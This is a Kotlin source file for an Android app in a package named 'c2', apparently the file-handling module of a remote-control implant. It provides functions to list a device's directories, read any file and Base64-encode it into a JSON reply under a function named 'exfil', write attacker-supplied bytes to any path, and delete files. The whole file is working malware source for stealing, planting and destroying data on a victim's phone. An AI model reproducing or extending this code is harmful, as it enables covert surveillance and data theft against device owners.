package com.outcome.c2

import android.content.Context
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object Files {

    fun listDir(path: String): JSONObject {
        val dir = File(path)
        if (!dir.exists() || !dir.isDirectory)
            return JSONObject().put("error", "not_a_directory")
        val arr = JSONArray()
        dir.listFiles()?.forEach { f ->
            arr.put(JSONObject().apply {
                put("name", f.name)
                put("path", f.absolutePath)
                put("size", f.length())
                put("is_dir", f.isDirectory)
                put("is_file", f.isFile)
                put("can_read", f.canRead())
                put("last_modified", f.lastModified())
            })
        }
        return JSONObject().put("path", path).put("count", arr.length()).put("entries", arr)
    }

    fun exfil(ctx: Context, path: String): JSONObject {
        val f = File(path)
        if (!f.exists() || !f.canRead())
            return JSONObject().put("error", "unreadable")
        if (f.length() > 8L * 1024 * 1024)
            return JSONObject().put("error", "file_too_large_for_inline")
        val bytes = f.readBytes()
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return JSONObject()
            .put("path", f.absolutePath)
            .put("size", bytes.size)
            .put("data_b64", b64)
    }

    fun upload(ctx: Context, remotePath: String, b64: String): JSONObject {
        return try {
            val f = File(remotePath)
            f.parentFile?.mkdirs()
            f.writeBytes(Base64.decode(b64, Base64.DEFAULT))
            JSONObject().put("ok", true).put("written", f.absolutePath)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "write_failed")
        }
    }

    fun delete(path: String): JSONObject {
        val f = File(path)
        return if (f.exists() && f.delete()) JSONObject().put("ok", true)
        else JSONObject().put("error", "delete_failed")
    }
}
